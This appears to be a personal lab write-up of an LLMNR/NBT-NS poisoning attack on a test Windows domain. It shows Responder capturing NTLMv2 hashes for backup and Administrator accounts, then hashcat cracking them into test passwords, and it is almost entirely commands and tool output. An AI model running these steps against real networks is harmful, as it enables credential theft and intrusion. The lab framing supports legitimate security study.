==================================================================================================================
LLMNR and NBNTS poisonning attack
==================================================================================================================

STEP 1 - Dumping NTLMV2 hashes with the tool RESPONDER
------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/CTFs/BadBlood$ sudo responder -I eth0 -w -r -f
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.0.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [ON]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.1.22]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Listening for events...
[*] [MDNS] Poisoned answer sent to 192.168.1.3     for name 140C76534D4E@Freebox Player._raop
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name testqsdnqsnksjncsqk
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] [NBT-NS] Poisoned answer sent to 192.168.1.50 for name PROXYSRV (service: Workstation/Redirector)
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name proxysrv
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[!]  Fingerprint failed
[*] [NBT-NS] Poisoned answer sent to 192.168.1.29 for name FREEBOX (service: File Server)
[!]  Fingerprint failed
[*] [NBT-NS] Poisoned answer sent to 192.168.1.29 for name WORKGROUP (service: Local Master Browser)
[!]  Fingerprint failed
[*] [NBT-NS] Poisoned answer sent to 192.168.1.29 for name SECURITY-LAB (service: Local Master Browser)
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name testqsdnqsnksjncsqk
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name testqsdnqsnksjncsqk
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name testqsdnqsnksjncsqk
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3

[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name testqsdnqsnksjncsqk
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[HTTP] NTLMv2 Client   : 192.168.1.50
[HTTP] NTLMv2 Username : SECURITY-LAB\backup
[HTTP] NTLMv2 Hash     : backup::SECURITY-LAB:e73e7e22b0655956:1F73801C162ECAC9135A4760B07DC082:010100000000000002178060DF12D601FB4D25E6DD98C7B6000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000100000C8609FB9D009AA2FDB70DDE9C3C16C42060365EE8FD2D5D8F40AC99B2A76B5F30A001000000000000000000000000000000000000900300048005400540050002F0074006500730074007100730064006E00710073006E006B0073006A006E006300730071006B000000000000000000                                                                                                                                            
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name testqsdnqsnksjncsqk

[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name ProxySrv
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name ProxySrv
<SNIP>
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] Skipping previously captured hash for SECURITY-LAB\backup
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name BackupServer2
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] Skipping previously captured hash for SECURITY-LAB\backup
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name BackupServer2
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] Skipping previously captured hash for SECURITY-LAB\backup
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name BackupServer2
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] Skipping previously captured hash for SECURITY-LAB\backup
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name BackupServer2
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] Skipping previously captured hash for SECURITY-LAB\backup
[*] [MDNS] Poisoned answer sent to 192.168.1.254   for name 68A3788B0CDD@Freebox Server._raop
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name BackupServer2
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3

[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name BackupServer2
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[SMB] NTLMv2-SSP Client   : 192.168.1.50
[SMB] NTLMv2-SSP Username : SECURITY-LAB\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::SECURITY-LAB:b4955c245780bbec:787BFF5DDF4FD394601C79C3529B9F71:0101000000000000C0653150DE09D201F0D61F80E9701CA1000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000C8609FB9D009AA2FDB70DDE9C3C16C42060365EE8FD2D5D8F40AC99B2A76B5F30A001000000000000000000000000000000000000900240063006900660073002F004200610063006B00750070005300650072007600650072003200000000000000000000000000                                                      
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name BackupServer2

[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] Skipping previously captured hash for SECURITY-LAB\Administrator
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name BackupServer2
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] Skipping previously captured hash for SECURITY-LAB\Administrator
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name BackupServer2
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] Skipping previously captured hash for SECURITY-LAB\Administrator
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name BackupServer2
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
[*] Skipping previously captured hash for SECURITY-LAB\Administrator
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name BackupServer2
[FINGER] OS Version     : Windows Server 2012 R2 Standard 9600
[FINGER] Client Version : Windows Server 2012 R2 Standard 6.3
<SNIP>

-----------------------

jeff@kali:~$ sudo ls -al /usr/share/responder/logs/
total 40
drwxr-xr-x 2 root root  4096 Apr 15 05:43 .
drwxr-xr-x 9 root root  4096 Apr 15 05:43 ..
-rw-r--r-- 1 root root     0 Apr 15 05:43 Analyzer-Session.log
-rw-r--r-- 1 root root 11744 Apr 15 05:43 Config-Responder.log
-rw-r--r-- 1 root root  1881 Apr 15 05:43 Poisoners-Session.log
-rw-r--r-- 1 root root  4491 Apr 15 05:43 Responder-Session.log
-rw-r--r-- 1 root root  5012 Apr 15 05:43 SMB-NTLMv2-SSP-192.168.1.50.txt


------------------------------------------------------------------------------------------------------------------
STEP 2 - Cracking the NTLMV2 hashes with the tool Hashcat
------------------------------------------------------------------------------------------------------------------

1. Cracking SMB-NTLMv2
-----------------------

jeff@kali:~/Documents/CTFs/BadBlood$ sudo hashcat -m 5600 -a 3 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt /home/jeff/Documents/CTFs/BadBlood/password-dico-test.txt --force

hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-4770HQ CPU @ 2.20GHz, 512/1493 MB allocatable, 2MCU

Hashes: 43 digests; 42 unique digests, 42 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

<SNIP>

Approaching final keyspace - workload adjusted.  

BACKUP::SECURITY-LAB:e586f068fe98c6b5:88e8dfe6de7241ad846f54c22b594c58:0101000000000000c0653150de09d201b751c75ec8d99ce4000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900240063006900660073002f004200610063006b00750070005300650072007600650072003200000000000000000000000000:Test1234
BACKUP::SECURITY-LAB:08bc47c5708cf2e3:7aa873123abfb64ec1e1ffaff3429cf8:0101000000000000c0653150de09d201d9cdb7d4665b2fa6000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900240063006900660073002f004200610063006b00750070005300650072007600650072003200000000000000000000000000:Test1234
<SNIP>

Session..........: hashcat
Status...........: Exhausted
Hash.Type........: NetNTLMv2
Hash.Target......: /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt
Time.Started.....: Wed Apr 15 06:11:01 2020 (1 sec)
Time.Estimated...: Wed Apr 15 06:11:02 2020 (0 secs)
Guess.Mask.......: Test1234 [8]
Guess.Queue......: 1/3 (33.33%)
Speed.#1.........:      178 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 35/42 (83.33%) Digests, 35/42 (83.33%) Salts
Progress.........: 42/42 (100.00%)
Rejected.........: 0/42 (0.00%)
Restore.Point....: 1/1 (100.00%)
Restore.Sub.#1...: Salt:41 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Test1234 -> Test1234

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

                                                 
Session..........: hashcat
Status...........: Exhausted
Hash.Type........: NetNTLMv2
Hash.Target......: /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt
Time.Started.....: Wed Apr 15 06:11:02 2020 (0 secs)
Time.Estimated...: Wed Apr 15 06:11:02 2020 (0 secs)
Guess.Mask.......: Test123 [7]
Guess.Queue......: 2/3 (66.67%)
Speed.#1.........:     2346 H/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 35/42 (83.33%) Digests, 35/42 (83.33%) Salts
Progress.........: 42/42 (100.00%)
Rejected.........: 0/42 (0.00%)
Restore.Point....: 1/1 (100.00%)
Restore.Sub.#1...: Salt:41 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Test123 -> Test123

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

ADMINISTRATOR::SECURITY-LAB:d3ed7df5a882d6e3:acf6065034152cb94a90fe0617eff5f5:0101000000000000c0653150de09d20159b2f5e36f688bc9000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900240063006900660073002f004200610063006b00750070005300650072007600650072003200000000000000000000000000:Test123456
ADMINISTRATOR::SECURITY-LAB:ef5d88bb05777f06:370f23a8029dd8bd21010d294e3fee15:0101000000000000c0653150de09d2019aa51e82243624bb000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900240063006900660073002f004200610063006b00750070005300650072007600650072003200000000000000000000000000:Test123456
<SNIP>

Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
Hash.Target......: /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt
Time.Started.....: Wed Apr 15 06:11:02 2020 (0 secs)
Time.Estimated...: Wed Apr 15 06:11:02 2020 (0 secs)
Guess.Mask.......: Test123456 [10]
Guess.Queue......: 3/3 (100.00%)
Speed.#1.........:     1363 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 42/42 (100.00%) Digests, 42/42 (100.00%) Salts
Progress.........: 27/42 (64.29%)
Rejected.........: 0/27 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:26 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Test123456 -> Test123456

Started: Wed Apr 15 06:10:59 2020
Stopped: Wed Apr 15 06:11:03 2020

---------------------------------

jeff@kali:~$ sudo hashcat -m 5600 -a 3 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50-2.txt /home/jeff/Documents/CTFs/BadBlood/password-dico-test.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-4770HQ CPU @ 2.20GHz, 512/1493 MB allocatable, 2MCU

Hashfile '/usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50-2.txt' on line 2 (2e2439...72003200000000000000000000000000): Separator unmatched
INFO: All hashes found in potfile! Use --show to display them.

Started: Tue May 26 17:14:48 2020
Stopped: Tue May 26 17:14:48 2020

---------------------------------

jeff@kali:~$ sudo hashcat -m 5600 -a 3 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50-2.txt /home/jeff/Documents/CTFs/BadBlood/password-dico-test.txt --force --show

Hashfile '/usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50-2.txt' on line 2 (2e2439...72003200000000000000000000000000): Separator unmatched
ADMINISTRATOR::SECURITY-LAB:fa493ec8a454937e:198a5a181dcfcadd8bf1a16a27093653:0101000000000000c0653150de09d20183059d7538ed0fdf000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900240063006900660073002f004200610063006b00750070005300650072007600650072003200000000000000000000000000:Test123456
BACKUP::SECURITY-LAB:1166f1f004ee9f91:cd99e5c1af06f514c1a054eb449e234b:0101000000000000c0653150de09d201c70ff35bc6fba542000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900240063006900660073002f004200610063006b00750070005300650072007600650072003200000000000000000000000000:Test1234


2. Cracking HTTP-NTLMv2
-----------------------

jeff@kali:~/Documents/CTFs/BadBlood$ sudo hashcat -m 5600 -a 3 /usr/share/responder/logs/HTTP-NTLMv2-192.168.1.50.txt /home/jeff/Documents/CTFs/BadBlood/password-dico-test.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-4770HQ CPU @ 2.20GHz, 512/1493 MB allocatable, 2MCU

Hashes: 2 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force

<SNIP>

Approaching final keyspace - workload adjusted.  

BACKUP::SECURITY-LAB:e73e7e22b0655956:1f73801c162ecac9135a4760b07dc082:010100000000000002178060df12d601fb4d25e6dd98c7b6000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c000800300030000000000000000100000000100000c8609fb9d009aa2fdb70dde9c3c16c42060365ee8fd2d5d8f40ac99b2a76b5f30a001000000000000000000000000000000000000900300048005400540050002f0074006500730074007100730064006e00710073006e006b0073006a006e006300730071006b000000000000000000:Test1234
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
Hash.Target......: BACKUP::SECURITY-LAB:e73e7e22b0655956:1f73801c162ec...000000
Time.Started.....: Wed Apr 15 06:12:04 2020 (0 secs)
Time.Estimated...: Wed Apr 15 06:12:04 2020 (0 secs)
Guess.Mask.......: Test1234 [8]
Guess.Queue......: 1/3 (33.33%)
Speed.#1.........:        5 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Test1234 -> Test1234

Started: Wed Apr 15 06:12:02 2020
Stopped: Wed Apr 15 06:12:05 2020

-----------------------------------

